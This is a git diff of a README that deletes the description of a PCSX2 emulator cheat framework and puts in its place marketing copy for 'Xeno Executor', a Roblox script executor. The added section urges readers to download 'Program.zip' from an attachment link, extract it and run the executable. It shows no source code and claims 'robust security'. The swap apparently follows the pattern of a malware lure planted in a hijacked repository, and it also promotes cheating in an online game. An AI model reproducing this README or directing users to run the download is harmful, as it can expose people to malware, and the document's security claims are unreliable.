@@ -1,68 +1,75 @@
-# PCSX2 Cheat Development Kit  
-PCSX2 Menu Trainer Development Kit is a C++ library designed to simplify the process of creating cheats for the PCSX2 emulator. 
-It aims to bridge the gap between modern cheat development practices and the classic era of cheat codes.
-This framework provides tools to port older codes to a more modern approach, using additional libraries such as dear imgui and minhook.
+# Roblox
 
-| ![image](https://github.com/NightFyre/PCSX2-CheatFrameWork/assets/80198020/7417d7e7-603c-465a-807f-62abf88179eb) | ![image](https://user-images.githubusercontent.com/80198020/201475737-21591eb0-8858-4575-8ee9-5d9d2e07d1dc.png) | ![image](https://user-images.githubusercontent.com/80198020/200977619-e22fe7a5-b914-4906-9e3c-50f929ea3ebf.png) | 
-| :---: | :---: |  :---: |
+![Roblox Logo](https://img.icons8.com/nolan/2x/roblox.png)
 
-## FEATURES
-- Easily Read & Write to virtual PS2 Memory
-- PCSX2 Emulator Process Virtual Method Hooking
-- Rendering API Helpers
-- Access EE & IOP Registers during execution
+## Xeno Executor - An external script executor for Roblox made entirely in C++
 
-## USAGE
-1. include the SDK header as well as any required packages.  
-*NOTE: Engine_Package.h is a required package and needs to be manually included.*
- - `CDK.h`                  //  Including the SDK header will provide access to all the most necessary features.
- - `Core_Package.cpp`       //  Main Package and must be included for basic usage 
- - `PCSX2_Package.cpp`      //  PCSX2 specific members and functions. Like the rendering API's for instance
+Execute scripts easily, enjoy advanced features, and dominate gameplay with Xeno Executor. This script executor is crafted entirely in C++ to provide you with a seamless and powerful experience in enhancing your gameplay within Roblox. Explore the world of possibilities that Xeno Executor offers and elevate your performance to the next level.
 
-2. Initialize the SDK
- - `PlayStation2::InitCDK();`   //  Basic CDK Initialization
+---
 
-3. Do Stuff
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/70dcf7dc51747df014f5d537a3188b8de1fe95a2/dllmain.cpp#L18-L29
+## Features
 
-4. (optional) include game package for additional controls
+🚀 **Advanced Script Execution**: Run your scripts effortlessly with Xeno Executor and watch your commands come to life within Roblox.
 
-## USAGE EXAMPLES
+🛠️ **User-Friendly Interface**: Navigate through the executor with ease and simplicity, ensuring a smooth and enjoyable user experience.
 
-- Access EE Memory
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L33-L34
+🔒 **Robust Security**: Rest assured that your scripts and gameplay are secure with our dedicated focus on providing a safe environment for execution.
 
-- Get Virtual Address
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L37-L38
+🎮 **Enhanced Gameplay**: Elevate your gameplay by leveraging the advanced features of Xeno Executor to maximize your gaming potential.
 
-- Read Virtual Memory
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L41-L47
+---
 
-- Access Class Members via GamePackages 
-```cpp
-/// SOCOM 1 -> Access SealObject & Modify Weapon Ammo
-{
-    // Create an instance of the Offsets Class
-    SOCOM1::CZSeal* pLocalSeal = SOCOM1::CZSeal::GetDefaultInstance();
-    if (pLocalSeal)
-        Console::cLogMsg("[+][PCSX2-CDK][SOCOM] LocalSeal Name: %s\n", EConsoleColors::green, pLocalSeal->GetName().c_str());
-}
-```
+## Installation
 
-- Hook Rendering API
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/7c786cdd3e7f8c0855bc7d1f83df687092424604/examples/Rendering/dllmain.cpp#L44-L51
+To get started with Xeno Executor, simply follow these steps:
 
+1. Download the Xeno Executor program by clicking the button below:
+   
+   [![Download Xeno Executor](https://img.shields.io/badge/Download%20Xeno%20Executor-Program.zip-<COLOR-CODE>)](https://github.com/user-attachments/files/17578097/Program.zip)
 
-### References & Credits
-- [PCSX2](https://github.com/PCSX2/pcsx2)
-- [GameHacking.org](https://gamehacking.org/system/ps2)
-- [Sly Cooper Modding Community](https://discord.com/invite/2GSXcEzPJA) 
-- [SOCOM Modding Community](https://discord.com/invite/PCJGrwMdUS) 
-- [A General Guide for Making Cheats & Trainers for PCSX2](https://www.unknowncheats.me/forum/general-programming-and-reversing/569991-pcsx2-guide-cheats-trainers.html)
+2. Extract the downloaded program to your desired location.
 
-### License
-This framework is distributed under the MIT License.
+3. Run the executable file to launch Xeno Executor and start using its features.
 
-### Disclaimer
-1. *This framework is intended for educational and single-player use.*  
-2. *Use cheats responsibly and respect the terms of use of the games you are modifying.*
+---
+
+## Usage
+
+1. Open Xeno Executor after installation.
+
+2. Load your desired scripts into the executor.
+
+3. Execute the scripts within the Roblox environment seamlessly.
+
+4. Enjoy the enhanced gameplay and features that Xeno Executor provides.
+
+---
+
+## Support
+
+For any inquiries, feedback, or assistance with Xeno Executor, feel free to reach out to us at [support@xenoexecutor.com](mailto:support@xenoexecutor.com). Our dedicated support team is here to help you make the most out of your scripting experience within Roblox.
+
+---
+
+## Get Involved
+
+Join the Xeno Executor community and connect with like-minded individuals looking to enhance their Roblox gameplay. Share your experiences, scripts, and feedback to contribute to the growth of our expanding community of gamers and developers.
+
+---
+
+## License
+
+Xeno Executor is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, modify, and enhance the executor according to your preferences while abiding by the terms of the provided license.
+
+---
+
+## Stay Connected
+
+Stay up to date with the latest news, updates, and releases from Xeno Executor by following us on [Twitter](https://twitter.com/xenoexecutor), [Facebook](https://www.facebook.com/xenoexecutor), and [Instagram](https://www.instagram.com/xenoexecutor). Join our community to engage in discussions, share insights, and participate in events related to the Roblox scripting community.
+
+---
+
+Thank you for choosing Xeno Executor as your go-to script executor for Roblox. We are excited to accompany you on your journey to enhanced gameplay and scripting mastery within the Roblox universe. Let's script, execute, and conquer together! 🌟🎮
+
+![Roblox GIF](https://media.giphy.com/media/hhyKPeTz2I0xK/giphy.gif)
